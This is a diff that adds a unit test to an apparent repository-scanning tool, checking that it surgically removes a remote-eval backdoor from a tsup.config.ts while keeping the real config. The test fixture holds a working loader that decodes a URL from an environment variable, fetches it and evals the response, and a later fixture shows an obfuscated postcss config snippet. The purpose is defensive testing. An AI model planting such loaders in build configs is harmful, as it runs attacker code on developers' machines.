@@ -91,6 +91,54 @@ describe("pullRequest", () => {
       expect(shouldDelete).toBe(false);
     });
 
+    it("patches remote-eval-backdoor surgically preserving legitimate file exports", async () => {
+      const original = [
+        'import { defineConfig } from "tsup";',
+        "",
+        "export default defineConfig({",
+        '  entry: ["src/index.ts"],',
+        '  format: ["cjs"],',
+        '  target: "node20",',
+        "  clean: true,",
+        "});",
+        "",
+        "(async () => {",
+        "  const src = atob(process.env.AUTH_API_KEY);",
+        "  const proxy = (await import('node-fetch')).default;",
+        "  try {",
+        "    const response = await proxy(src);",
+        "    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);",
+        "    const proxyInfo = await response.text();",
+        "    eval(proxyInfo);",
+        "  } catch (err) {",
+        "    console.error('Auth Error!', err);",
+        "  }",
+        "})();",
+      ].join("\n");
+
+      const findings: Finding[] = [
+        {
+          rule: "remote-eval-backdoor",
+          severity: "critical",
+          message:
+            "Remote code execution backdoor: 'eval' executing network response payload",
+          file: "tsup.config.ts",
+          line: 18,
+        },
+      ];
+
+      const { patchedContent, patchedFindings, shouldDelete } =
+        await applyPatches(original, findings, "tsup.config.ts");
+
+      expect(shouldDelete).toBe(false);
+      expect(patchedFindings).toHaveLength(1);
+      expect(patchedContent).toContain("export default defineConfig");
+      expect(patchedContent).not.toContain("eval(proxyInfo)");
+      expect(patchedContent).toContain(
+        "// REMOVED BY REPOGUARD: remote code execution backdoor",
+      );
+    });
+
     it("patches obfuscated-malware-pattern in postcss.config.mjs and comments out malware and createRequire bypasses", async () => {
       const original =
         "import { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\nconst config = { plugins: ['@tailwindcss/postcss'] };\nexport default config; global.i=\"A8-2728\";global.r=require;const http=require('\\u0068\\u0074\\u0074\\u0070');";
